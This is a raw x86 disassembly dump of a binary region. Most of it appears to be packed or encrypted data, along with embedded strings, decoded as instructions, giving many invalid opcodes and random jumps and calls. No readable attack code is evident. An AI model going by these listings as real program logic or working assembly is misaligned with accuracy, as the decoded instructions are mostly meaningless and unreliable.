  41f9cb:	mov    esp,0xa1bca206
  41f9d0:	jge    0x41f976
  41f9d2:	cmp    al,0x5f
  41f9d4:	clc    
  41f9d5:	and    BYTE PTR [esi+0x71],ah
  41f9d8:	dec    esi
  41f9d9:	jmp    0x41fa0d
  41f9db:	push   ecx
  41f9dc:	out    dx,eax
  41f9dd:	sbb    DWORD PTR [ecx],0x49cb364f
  41f9e3:	pop    ebx
  41f9e4:	jb     0x41f9bb
  41f9e6:	dec    edx
  41f9e7:	outs   dx,BYTE PTR ds:[esi]
  41f9e8:	pushf  
  41f9e9:	enter  0xaa9c,0x16
  41f9ed:	sub    ebp,esp
  41f9ef:	jecxz  0x41f986
  41f9f1:	idiv   BYTE PTR gs:[edi]
  41f9f4:	and    DWORD PTR [ebx],edx
  41f9f6:	mov    dl,0x93
  41f9f8:	popa   
  41f9f9:	loope  0x41f9b4
  41f9fb:	pop    ecx
  41f9fc:	mov    ebx,0xbb
	...
  41fa09:	add    BYTE PTR [eax],al
  41fa0b:	(bad)  
  41fa0d:	test   eax,0xddffeef7
  41fa13:	and    al,0x1
  41fa15:	pop    ebp
  41fa16:	dec    edi
  41fa17:	mov    ds:0x15790211,eax
  41fa1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa1d:	add    DWORD PTR [eax],eax
  41fa1f:	stos   DWORD PTR es:[edi],eax
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	add    cl,al
  41fa24:	imul   esp,DWORD PTR [edi],0x3f
  41fa27:	test   eax,0xfc40e38b
  41fa2c:	mov    esi,0x662f684c
  41fa31:	xchg   ebx,eax
  41fa32:	xchg   esi,eax
  41fa33:	adc    bh,BYTE PTR [edx+0x32]
  41fa36:	ss pop ecx
  41fa38:	jle    0x41fa47
  41fa3a:	dec    esi
  41fa3b:	push   ebp
  41fa3c:	es push esp
  41fa3e:	shr    DWORD PTR [ebx+0x66],1
  41fa41:	mov    esp,0x2ea66083
  41fa46:	xchg   edi,eax
  41fa47:	cmp    DWORD PTR [ecx],ebx
  41fa49:	jp     0x41f9cc
  41fa4b:	push   ss
  41fa4c:	lds    eax,FWORD PTR [eax+ebx*4-0x1c]
  41fa50:	stos   BYTE PTR es:[edi],al
  41fa51:	cmovle eax,edi
  41fa54:	xor    esp,esi
  41fa56:	mov    ecx,DWORD PTR [esi+0x394bcf99]
  41fa5c:	into   
  41fa5d:	mov    dl,0x94
  41fa5f:	call   0x64bd8228
  41fa64:	(bad)  
  41fa65:	pop    edi
  41fa66:	adc    al,0x7f
  41fa68:	mov    BYTE PTR [edi-0x5b],dh
  41fa6b:	lods   al,BYTE PTR ds:[esi]
  41fa6c:	fist   DWORD PTR [ecx-0x70]
  41fa6f:	les    edi,FWORD PTR [ebx+0x64]
  41fa72:	lods   eax,DWORD PTR ds:[esi]
  41fa73:	sub    BYTE PTR [ecx+0x6f5051cf],0x34
  41fa7a:	xchg   esp,eax
  41fa7b:	jno    0x41fa9b
  41fa7d:	inc    edi
  41fa7e:	adc    DWORD PTR [ebx],edi
  41fa80:	std    
  41fa81:	ret    0xc604
  41fa84:	or     DWORD PTR [esi+0x31],0x2e62f314
  41fa8b:	sbb    al,0x9a
  41fa8d:	loope  0x41faec
  41fa8f:	pusha  
  41fa90:	leave  
  41fa91:	je     0x41fa3a
  41fa93:	clc    
  41fa94:	push   ss
  41fa95:	xor    edx,esi
  41fa97:	mov    eax,ds:0x5f4ffa3a
  41fa9c:	jl     0x41fa6b
  41fa9e:	pop    ss
  41fa9f:	ss (bad) 
  41faa1:	and    cl,bl
  41faa3:	xchg   BYTE PTR [esi],cl
  41faa5:	fst    QWORD PTR [ebx]
  41faa7:	xchg   esp,eax
  41faa8:	xor    dh,bh
  41faaa:	(bad)  
  41faab:	int    0x93
  41faad:	scas   eax,DWORD PTR es:[edi]
  41faae:	jg     0x41fb1f
  41fab0:	mov    bh,0xa0
  41fab2:	daa    
  41fab3:	jle    0x41fa9a
  41fab5:	inc    edx
  41fab6:	jns    0x41fa76
  41fab8:	(bad)  
  41fab9:	and    eax,DWORD PTR [ebx]
  41fabb:	and    BYTE PTR [edx-0x2e],al
  41fabe:	xlat   BYTE PTR ds:[ebx]
  41fabf:	fstp   st(0)
  41fac1:	scas   eax,DWORD PTR es:[edi]
  41fac2:	mov    edi,0x3a5b010c
  41fac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fac8:	or     al,0xd6
  41faca:	pop    ecx
  41facb:	inc    ebp
  41facc:	fnstenv [edx+0x0]
	...
  41fada:	add    BYTE PTR [edi-0x5e],ch
  41fadd:	aam    0x2a
  41fadf:	fnstsw WORD PTR [esi-0x1]
  41fae2:	out    0x52,eax
  41fae4:	fcmovu st,st(5)
  41fae6:	in     eax,0xdd
  41fae8:	mov    DWORD PTR [eax],esp
  41faea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faeb:	shl    BYTE PTR [edi+0xab0001],0x0
  41faf2:	add    BYTE PTR [eax+0x42],al
  41faf5:	jge    0x41fb5d
  41faf7:	pop    ebx
  41faf8:	lea    ebp,[ebx]
  41fafa:	test   BYTE PTR [ebx-0x5f251707],al
  41fb00:	fidivr DWORD PTR [eax+0x303eccfd]
  41fb06:	inc    ebx
  41fb07:	int3   
  41fb08:	jl     0x41fb1e
  41fb0a:	test   eax,0x5c08938d
  41fb0f:	popf   
  41fb10:	sub    esi,0x5f
  41fb13:	xor    BYTE PTR [ebp+0x50],bl
  41fb16:	call   0x440f:0x7b42be01
  41fb1d:	jne    0x41fae2
  41fb1f:	jmp    0xbb1675a6
  41fb24:	mov    edi,0x813d2238
  41fb29:	pushf  
  41fb2a:	sbb    DWORD PTR [eax],ebx
  41fb2c:	repz sub al,0x5a
  41fb2f:	or     esp,DWORD PTR ss:[eax-0x70]
  41fb33:	push   edx
  41fb34:	or     al,0xf4
  41fb36:	xor    ebx,0x47
  41fb39:	scas   al,BYTE PTR es:[edi]
  41fb3a:	and    DWORD PTR [ebp-0x5b68cd35],0xfffffffb
  41fb41:	pop    es
  41fb42:	das    
  41fb43:	xchg   BYTE PTR [edi+0xd558dd8],ah
  41fb49:	xchg   esi,eax
  41fb4a:	call   0x7fa45667
  41fb4f:	xchg   DWORD PTR [ebx],edx
  41fb51:	inc    edi
  41fb52:	sub    BYTE PTR [ebx+0x13],0xf
  41fb56:	add    DWORD PTR [esi+0xc],0xd266c30c
  41fb5d:	inc    esp
  41fb5e:	pop    es
  41fb5f:	jmp    0x6e16429e
  41fb64:	in     eax,dx
  41fb65:	sbb    BYTE PTR ds:0x57862952,al
  41fb6b:	add    DWORD PTR [edx],ebx
  41fb6d:	sbb    ecx,DWORD PTR ds:0xe77707ca
  41fb73:	aaa    
  41fb74:	push   ebx
  41fb75:	sub    BYTE PTR [ebx-0x6a],dl
  41fb78:	cmp    BYTE PTR [edi],al
  41fb7a:	jl     0x41fb15
  41fb7c:	dec    edx
  41fb7d:	sti    
  41fb7e:	xchg   ebp,eax
  41fb7f:	dec    ecx
  41fb80:	retf   0x747e
  41fb83:	sbb    ebx,DWORD PTR [ebx-0x18]
  41fb86:	in     al,0x72
  41fb88:	adc    DWORD PTR [eax],ebx
  41fb8a:	jmp    0x7708f422
  41fb8f:	push   0xffffffe7
  41fb91:	add    al,0x17
  41fb93:	out    dx,al
  41fb94:	pop    edx
  41fb95:	(bad)  
  41fb96:	fldcw  WORD PTR [ecx]
  41fb98:	mov    ah,0x75
  41fb9a:	jb     0x41fb31
  41fb9c:	(bad)  
  41fb9d:	icebp  
	...
  41fbaa:	add    cl,bh
  41fbac:	sbb    al,al
  41fbae:	inc    esi
  41fbaf:	jecxz  0x41fb8f
  41fbb1:	(bad)  
  41fbb2:	mov    edi,0xe1f1bc83
  41fbb7:	ins    BYTE PTR es:[edi],dx
  41fbb8:	push   cs
  41fbb9:	(bad)  
  41fbba:	stos   BYTE PTR es:[edi],al
  41fbbb:	imul   ebp,DWORD PTR [eax+0xab0001],0x0
  41fbc2:	add    BYTE PTR [ecx-0x4685aa51],bl
  41fbc8:	mov    ds:0xbc3c37e0,eax
  41fbcd:	mov    bh,0xc2
  41fbcf:	mov    edi,0x63ec270b
  41fbd4:	int    0x4b
  41fbd6:	cmp    BYTE PTR [edx],ah
  41fbd8:	jns    0x41fb7f
  41fbda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbdb:	push   ds
  41fbdc:	mov    ?,WORD PTR [edi+0x61]
  41fbdf:	loopne 0x41fbef
  41fbe1:	or     DWORD PTR [ebp-0x8],ebp
  41fbe4:	mov    ch,al
  41fbe6:	inc    edi
  41fbe7:	jl     0x41fc21
  41fbe9:	mov    eax,0x590c8673
  41fbee:	jne    0x41fc14
  41fbf0:	push   esp
  41fbf1:	sbb    eax,0x2c882212
  41fbf6:	cmp    bl,BYTE PTR [ebx+0x3a5fd977]
  41fbfc:	push   esi
  41fbfd:	cmp    eax,DWORD PTR [eax-0x2b79d4ea]
  41fc03:	je     0x41fc48
  41fc05:	jo     0x33a8b8de
  41fc0b:	das    
  41fc0c:	retf   0x4c98
  41fc0f:	sbb    BYTE PTR [edi+0x40],dl
  41fc12:	mov    edi,0x511481f1
  41fc17:	fwait
  41fc18:	add    al,0xa2
  41fc1a:	mov    WORD PTR [eax],?
  41fc1c:	cmc    
  41fc1d:	lahf   
  41fc1e:	les    ebx,FWORD PTR [eax+0x10883935]
  41fc24:	call   0x9f10:0x62c2fdc7
  41fc2b:	punpckhwd mm7,QWORD PTR [ebp-0x4256f8ef]
  41fc32:	mov    ah,0xe9
  41fc34:	dec    ebp
  41fc35:	aas    
  41fc36:	ds clc 
  41fc38:	push   esp
  41fc39:	pop    eax
  41fc3a:	mov    bh,0xd3
  41fc3c:	inc    edi
  41fc3d:	dec    ebx
  41fc3e:	scas   eax,DWORD PTR es:[edi]
  41fc3f:	push   ebp
  41fc40:	mov    eax,0xdb6d3a87
  41fc45:	sbb    dh,ah
  41fc47:	add    eax,0xefeea223
  41fc4c:	cdq    
  41fc4d:	dec    eax
  41fc4e:	in     al,0x78
  41fc50:	fucomp st(6)
  41fc52:	int    0x83
  41fc54:	ins    BYTE PTR es:[edi],dx
  41fc55:	(bad)  
  41fc56:	(bad)  
  41fc58:	retf   
  41fc59:	jnp    0x41fcbe
  41fc5b:	into   
  41fc5c:	(bad)  
  41fc5e:	repnz dec ecx
  41fc60:	push   ss
  41fc61:	js     0x41fbf5
  41fc63:	and    al,0xd1
  41fc65:	dec    eax
  41fc66:	into   
  41fc67:	inc    ebp
  41fc68:	lock rol DWORD PTR ds:0x4c168a,1
	...
  41fc7b:	mov    eax,ds:0x3e8336b9
  41fc80:	(bad)  
  41fc81:	mov    ch,0xbb
  41fc83:	icebp  
  41fc84:	and    eax,0x3e0c8c27
  41fc89:	(bad)
  41fc8c:	test   eax,0xab0001
  41fc91:	add    BYTE PTR [eax],al
  41fc93:	retf   0x9484
  41fc96:	(bad)  
  41fc97:	fisub  DWORD PTR [ebx+eax*8-0x5ad16800]
  41fc9e:	mov    ds:0xd7cdd0b7,eax
  41fca3:	adc    DWORD PTR [eax-0x49fdb7d2],edx
  41fca9:	mov    ecx,0x72a6b321
  41fcae:	(bad)  
  41fcb0:	mov    DWORD PTR [esi],ebp
  41fcb2:	cmp    cl,BYTE PTR [edx+0x12]
  41fcb5:	repz (bad) 
  41fcb7:	sbb    eax,0x322d1cd8
  41fcbc:	mov    eax,0x533cab3b
  41fcc1:	shl    BYTE PTR [edi-0x35],0xd4
  41fcc5:	mov    BYTE PTR [edi-0x5e],al
  41fcc8:	sub    al,BYTE PTR [ebp-0x2ac40562]
  41fcce:	dec    ebx
  41fccf:	add    ebp,DWORD PTR [edx+0xc81373b]
  41fcd5:	test   BYTE PTR [edx+0x42cecf40],ch
  41fcdb:	sbb    DWORD PTR [edi+ecx*8+0x75107646],esp
  41fce2:	or     dh,dh
  41fce4:	dec    esp
  41fce5:	(bad)  
  41fce7:	sub    DWORD PTR [ebp-0x40cfc4c],0xfffffff8
  41fcee:	xchg   esp,eax
  41fcef:	lea    edx,[ebp-0x4d80d411]
  41fcf5:	sahf   
  41fcf6:	or     eax,0xa8537c1f
  41fcfb:	aam    0x9d
  41fcfd:	cli    
  41fcfe:	xchg   edx,eax
  41fcff:	lds    edi,FWORD PTR [eax+0x31]
  41fd02:	push   ss
  41fd03:	push   ebp
  41fd04:	mov    fs,WORD PTR [ebx-0x33]
  41fd07:	imul   ebp,ebp,0x4abcacf1
  41fd0d:	(bad)
  41fd10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd11:	fsub   st(0),st
  41fd13:	sbb    edx,edx
  41fd15:	jo     0x41fd45
  41fd17:	je     0x41fd0f
  41fd19:	lods   al,BYTE PTR ds:[esi]
  41fd1a:	(bad)  
  41fd1b:	out    dx,al
  41fd1c:	mov    BYTE PTR [edi],bh
  41fd1e:	add    ebx,DWORD PTR [eax]
  41fd20:	sbb    esp,DWORD PTR [edi]
  41fd22:	(bad)  
  41fd23:	cmp    DWORD PTR [eax+0x6df13b35],ebx
  41fd29:	test   BYTE PTR [ebx-0x4],ah
  41fd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd2d:	loopne 0x41fd8f
  41fd2f:	retf   0x82f
  41fd32:	xchg   BYTE PTR [edx+0x172a0ac3],al
  41fd38:	pushw  0x7df0
  41fd3c:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x0
	...
  41fd49:	add    BYTE PTR [eax],al
  41fd4b:	adc    dl,bh
  41fd4d:	repz or esi,edi
  41fd50:	das    
  41fd51:	cli    
  41fd52:	fist   WORD PTR [ecx]
  41fd54:	dec    ebx
  41fd55:	es nop
  41fd57:	pushf  
  41fd58:	leave  
  41fd59:	(bad)  
  41fd5a:	iret   
  41fd5b:	shr    DWORD PTR [ecx+0xab0001],0x0
  41fd62:	add    bh,dh
  41fd64:	push   ebp
  41fd65:	jne    0x41fce7
  41fd67:	fxtract 
  41fd69:	adc    DWORD PTR [edi-0x3a],esp
  41fd6c:	lea    eax,[edi]
  41fd6e:	and    al,0xbb
  41fd70:	pop    ss
  41fd71:	and    DWORD PTR [esi-0x48],ecx
  41fd74:	sbb    BYTE PTR [ebx],ah
  41fd76:	aam    0xd5
  41fd78:	pop    eax
  41fd79:	push   edi
  41fd7a:	retf   0x92d1
  41fd7d:	mov    al,ds:0x7150da9
  41fd82:	call   0xcd64:0x73202264
  41fd89:	icebp  
  41fd8a:	dec    ebx
  41fd8b:	fcomp  QWORD PTR [esi-0x187cb47c]
  41fd91:	mov    eax,0xa5b9ec
  41fd96:	repz pop ss
  41fd98:	call   0xecb:0x98700b0b
  41fd9f:	pop    esp
  41fda0:	adc    al,0x16
  41fda2:	leave  
  41fda3:	ret    0x5d24
  41fda6:	into   
  41fda7:	sub    ecx,ebx
  41fda9:	adc    BYTE PTR [ebx+0x34e16522],bl
  41fdaf:	(bad)  
  41fdb0:	mov    bl,0x6e
  41fdb2:	iret   
  41fdb3:	xchg   DWORD PTR [edx-0x6005583e],eax
  41fdb9:	dec    ebx
  41fdba:	sbb    DWORD PTR [edi],0x7910ce8c
  41fdc0:	mov    cs,esp
  41fdc2:	fadd   QWORD PTR cs:[edi+edi*2+0x1a]
  41fdc7:	ror    bh,cl
  41fdc9:	ds mov esi,0xe7ca06c
  41fdcf:	and    esi,DWORD PTR [ebp+0x63]
  41fdd2:	pop    esi
  41fdd3:	adc    edx,eax
  41fdd5:	fnstcw WORD PTR [ebx+0x24]
  41fdd8:	and    ch,BYTE PTR [edx+eiz*4+0xf5af090]
  41fddf:	adc    bh,BYTE PTR [edi-0x7a1ec65f]
  41fde5:	div    DWORD PTR [esi+0x7b]
  41fde8:	out    0xb6,eax
  41fdea:	stc    
  41fdeb:	mov    cl,0xa
  41fded:	test   al,0x1f
  41fdef:	js     0x41fe4e
  41fdf1:	repz dec ebp
  41fdf3:	iret   
  41fdf4:	or     eax,0xcf28cb6a
  41fdf9:	cwde   
  41fdfa:	dec    ecx
  41fdfb:	jno    0x41fdd3
  41fdfd:	popf   
  41fdfe:	mov    esi,0x3b417923
  41fe03:	les    ecx,FWORD PTR [edx-0x6]
  41fe06:	aad    0xd9
  41fe08:	pop    esi
  41fe09:	das    
  41fe0a:	xchg   edx,eax
  41fe0b:	xor    al,0x1a
  41fe0d:	outs   dx,BYTE PTR ds:[esi]
	...
  41fe1a:	add    BYTE PTR [edx],dl
  41fe1c:	mov    edx,0xe6f8c6d8
  41fe21:	push   ds
  41fe22:	(bad)  
  41fe23:	adc    bl,dh
  41fe25:	cwde   
  41fe26:	out    dx,al
  41fe27:	adc    DWORD PTR [edi+0x63],ebp
  41fe2a:	pusha  
  41fe2b:	ins    BYTE PTR es:[edi],dx
  41fe2c:	stos   BYTE PTR es:[edi],al
  41fe2d:	add    DWORD PTR [eax],eax
  41fe2f:	stos   DWORD PTR es:[edi],eax
  41fe30:	add    BYTE PTR [eax],al
  41fe32:	add    cl,ah
  41fe34:	dec    eax
  41fe35:	push   ds
  41fe36:	pop    esp
  41fe37:	mov    ebx,0xf02a410
  41fe3c:	clc    
  41fe3d:	xchg   esi,eax
  41fe3e:	push   0x33
  41fe40:	or     BYTE PTR [ebp+0xe673bfe],0xc6
  41fe47:	pop    es
  41fe48:	lahf   
  41fe49:	push   esp
  41fe4a:	push   cs
  41fe4b:	ret    
  41fe4c:	dec    edx
  41fe4d:	sub    BYTE PTR [ecx+0x1e],0x1
  41fe51:	fld    QWORD PTR [ebx+0x5208852a]
  41fe57:	jecxz  0x41febd
  41fe59:	gs adc bh,dh
  41fe5c:	sub    eax,0xd086255f
  41fe61:	pop    ebp
  41fe62:	fdiv   DWORD PTR [eax]
  41fe64:	fwait
  41fe65:	gs test eax,0x54f41d2d
  41fe6b:	jl     0x41feb8
  41fe6d:	lock add DWORD PTR [esi+eiz*8-0x1e],ecx
  41fe72:	mov    esi,0xe1a2f3ca
  41fe77:	scas   eax,DWORD PTR es:[edi]
  41fe78:	inc    DWORD PTR [esi+0x408095c6]
  41fe7e:	adc    edx,DWORD PTR [edx+0x3c]
  41fe81:	aaa    
  41fe82:	inc    edi
  41fe83:	xchg   edi,eax
  41fe84:	cmp    DWORD PTR [edx],0xffffffa5
  41fe87:	fld    QWORD PTR [eax-0x2b]
  41fe8a:	retf   0x9db1
  41fe8d:	icebp  
  41fe8e:	ja     0x41fedc
  41fe90:	and    BYTE PTR [edi-0x742e2901],cl
  41fe96:	fcom   DWORD PTR [esi-0x7c]
  41fe99:	fst    DWORD PTR [ebx]
  41fe9b:	daa    
  41fe9c:	outs   dx,DWORD PTR ds:[esi]
  41fe9d:	mov    ds:0x238e6343,eax
  41fea2:	pop    edi
  41fea3:	rcr    DWORD PTR [ecx-0x6a12923f],1
  41fea9:	pop    ebp
  41feaa:	sub    eax,0xc6bdd069
  41feaf:	call   0xce98:0x6c41ee66
  41feb6:	inc    DWORD PTR [edi]
  41feb8:	pop    ebp
  41feb9:	jne    0x41fec2
  41febb:	jp     0x41feea
  41febd:	mov    dh,0x30
  41febf:	sahf   
  41fec0:	sbb    ebx,ecx
  41fec2:	lods   eax,DWORD PTR ds:[esi]
  41fec3:	nop
  41fec4:	out    dx,al
  41fec5:	call   0x77c072b
  41feca:	mov    ds:0x81fe8503,al
  41fecf:	rep stos BYTE PTR es:[edi],al
  41fed1:	ins    DWORD PTR es:[edi],dx
  41fed2:	dec    eax
  41fed3:	retf   0x59d6
  41fed6:	push   ds
  41fed7:	mov    al,0x2
  41fed9:	mov    dh,0xd6
  41fedb:	mov    DWORD PTR [ecx],edx
  41fedd:	lds    eax,FWORD PTR [eax]
	...
  41feeb:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41fef1:	inc    edx
  41fef2:	add    BYTE PTR [eax],cl
  41fef4:	nop
  41fef5:	inc    edx
  41fef6:	add    BYTE PTR [eax+edx*4],cl
  41fef9:	inc    edx
  41fefa:	add    BYTE PTR [eax],dl
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],dl
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],bl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],bl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [esi+0x49],cl
  41ff0d:	dec    esi
  41ff0e:	pop    edi
  41ff0f:	pop    edx
  41ff10:	dec    edx
  41ff11:	inc    ecx
  41ff12:	xor    eax,DWORD PTR [eax]
  41ff14:	push   ebx
  41ff15:	push   edi
  41ff16:	inc    edi
  41ff17:	cmp    DWORD PTR [edi+0x41],ebx
  41ff1a:	pop    eax
  41ff1b:	ss push esi
  41ff1d:	pop    ecx
  41ff1e:	add    BYTE PTR [ebx+0x43],dl
  41ff21:	inc    ebp
  41ff22:	pop    edi
  41ff23:	inc    ecx
  41ff24:	pop    eax
  41ff25:	push   edi
  41ff26:	dec    eax
  41ff27:	inc    edx
  41ff28:	pop    edi
  41ff29:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff2c:	dec    ecx
  41ff2d:	add    BYTE PTR [ecx+0x46],al
  41ff30:	cmp    DWORD PTR [edx],esi
  41ff32:	xor    ebx,DWORD PTR [edi+0x32]
  41ff35:	aaa    
  41ff36:	inc    esp
  41ff37:	inc    esp
  41ff38:	pop    edi
  41ff39:	xor    eax,0x41545800
  41ff3e:	pop    edi
  41ff3f:	push   ecx
  41ff40:	push   esp
  41ff41:	inc    esi
  41ff42:	push   ebp
  41ff43:	cmp    DWORD PTR [eax],eax
  41ff45:	push   edi
  41ff46:	push   ebp
  41ff47:	inc    ecx
  41ff48:	xor    dh,BYTE PTR [ebx]
  41ff4a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff4d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff51:	cmp    DWORD PTR [edi+0x38],ebx
  41ff54:	dec    ecx
  41ff55:	cmp    DWORD PTR [edx+0x36],ebx
  41ff58:	pop    edi
  41ff59:	dec    edx
  41ff5a:	xor    BYTE PTR [edx+0x34],cl
  41ff5d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff61:	xor    esi,DWORD PTR [eax]
  41ff63:	pop    edi
  41ff64:	inc    edx
  41ff65:	dec    ebx
  41ff66:	pop    eax
  41ff67:	pop    eax
  41ff68:	xor    eax,0x51414d00
  41ff6d:	pop    edi
  41ff6e:	inc    ecx
  41ff6f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff72:	inc    ecx
  41ff73:	dec    ebx
  41ff74:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff7a:	inc    ebp
  41ff7b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff7e:	ss dec eax
  41ff80:	dec    ebx
  41ff81:	add    BYTE PTR [ebp+0x57],al
  41ff84:	xor    DWORD PTR [edi+0x31],ebx
  41ff87:	dec    ebx
  41ff88:	xor    eax,DWORD PTR [ecx+0x30]
  41ff8b:	push   ebx
  41ff8c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff90:	aaa    
  41ff91:	pop    edi
  41ff92:	push   edx
  41ff93:	dec    eax
  41ff94:	dec    ebp
  41ff95:	cmp    BYTE PTR [edi+0x37],bl
  41ff98:	inc    esi
  41ff99:	xor    eax,0x35005500
  41ff9e:	add    BYTE PTR [ebx+0x0],al
  41ffa1:	pop    edi
  41ffa2:	add    BYTE PTR [ecx+0x0],bl
  41ffa5:	dec    ecx
  41ffa6:	add    BYTE PTR [ebx+0x0],dl
  41ffa9:	xor    al,BYTE PTR [eax]
  41ffab:	pop    edi
  41ffac:	add    BYTE PTR [edx+0x0],dl
  41ffaf:	add    BYTE PTR [eax],al
  41ffb1:	push   eax
  41ffb2:	add    BYTE PTR [ebp+0x0],dl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [eax],dh
  41ffb8:	add    BYTE PTR [edi+0x0],bl
  41ffbb:	inc    ebx
  41ffbc:	add    BYTE PTR [esi],dh
  41ffbe:	add    BYTE PTR [ebp+0x0],al
  41ffc1:	xor    al,BYTE PTR [eax]
  41ffc3:	pop    edi
  41ffc4:	add    BYTE PTR [ebp+0x0],cl
  41ffc7:	xor    al,0x0
  41ffc9:	dec    edx
  41ffca:	add    BYTE PTR [edx+0x0],dl
  41ffcd:	push   ebp
  41ffce:	add    BYTE PTR [eax],al
  41ffd0:	add    BYTE PTR [esi+0x0],cl
  41ffd3:	cmp    DWORD PTR [eax],eax
  41ffd5:	push   eax
  41ffd6:	add    BYTE PTR [edi+0x0],bl
  41ffd9:	push   ebp
  41ffda:	add    BYTE PTR [ecx],bh
  41ffdc:	add    BYTE PTR [esi],dh
  41ffde:	add    BYTE PTR [eax],dh
  41ffe0:	add    BYTE PTR [ecx],dh
  41ffe2:	add    BYTE PTR [edi+0x0],bl
  41ffe5:	dec    edi
  41ffe6:	add    BYTE PTR [esi+0x0],cl
  41ffe9:	push   esp
  41ffea:	add    BYTE PTR [eax],bh
  41ffec:	add    BYTE PTR [eax],al
  41ffee:	add    BYTE PTR [eax+eax*1+0x34],cl
  41fff2:	add    BYTE PTR [eax+eax*1+0x31],al
  41fff6:	add    BYTE PTR [edi+0x0],bl
  41fff9:	dec    ebx
  41fffa:	add    BYTE PTR [ecx],dh
  41fffc:	add    BYTE PTR [ebp+0x0],al
  41ffff:	pop    edi
  420000:	add    BYTE PTR [edx+0x0],bl
  420003:	add    BYTE PTR [eax],al
  420005:	push   esp
  420006:	add    BYTE PTR [edi],dh
  420008:	add    BYTE PTR [ebx+0x0],al
  42000b:	pop    edi
  42000c:	add    BYTE PTR [edx+0x0],al
  42000f:	xor    al,BYTE PTR [eax]
  420011:	xor    DWORD PTR [eax],eax
  420013:	push   ebx
  420014:	add    BYTE PTR [ecx],dh
  420016:	add    BYTE PTR [ecx],bh
  420018:	add    BYTE PTR [edx+0x0],al
  42001b:	add    BYTE PTR [eax],al
  42001d:	inc    edi
  42001e:	add    BYTE PTR [ebp+0x0],al
  420021:	xor    al,0x0
  420023:	cmp    BYTE PTR [eax],al
  420025:	add    BYTE PTR [eax],al
  420027:	add    BYTE PTR [eax+0x42],dl
  42002a:	add    BYTE PTR [eax+edx*2],al
  42002d:	inc    edx
  42002e:	add    BYTE PTR [eax],cl
  420030:	push   eax
  420031:	inc    edx
  420032:	add    BYTE PTR [eax+edx*2],cl
  420035:	inc    edx
  420036:	add    BYTE PTR [eax],dl
  420038:	push   eax
  420039:	inc    edx
  42003a:	add    BYTE PTR [eax+edx*2],dl
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],bl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],bl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],ah
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],ah
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],ch
  420050:	push   eax
  420051:	inc    edx
	...
  420062:	add    BYTE PTR [eax],al
  420064:	call   0x0:0x4d3ef2
  42006b:	add    BYTE PTR [edx+0x1000200],dl
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [ecx],al
  420075:	add    BYTE PTR [eax],al
  420077:	add    BYTE PTR [ecx],al
  420079:	add    BYTE PTR [eax],al
  42007b:	add    BYTE PTR [eax-0x73fffe00],cl
  420081:	add    BYTE PTR [edx],al
  420083:	add    BYTE PTR [eax-0x23fffe00],dl
  420089:	cmp    al,0x0
  42008b:	add    BYTE PTR [esi+0x200],bl
  420091:	add    BYTE PTR [edi+0x6f],dl
  420094:	jb     0x4200fa
  420096:	push   edi
  420097:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42009e:	aas    
  42009f:	inc    ebx
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	outs   dx,DWORD PTR ds:[esi]
  4200a2:	jae    0x420109
  4200a4:	push   edi
  4200a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200ac:	popa   
  4200ad:	je     0x420118
  4200af:	outs   dx,DWORD PTR ds:[esi]
  4200b0:	outs   dx,BYTE PTR ds:[esi]
  4200b1:	inc    ebx
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	outs   dx,DWORD PTR ds:[esi]
  4200b4:	jae    0x42011b
  4200b6:	push   edi
  4200b7:	imul   eax,DWORD PTR [eax],0x0
	...
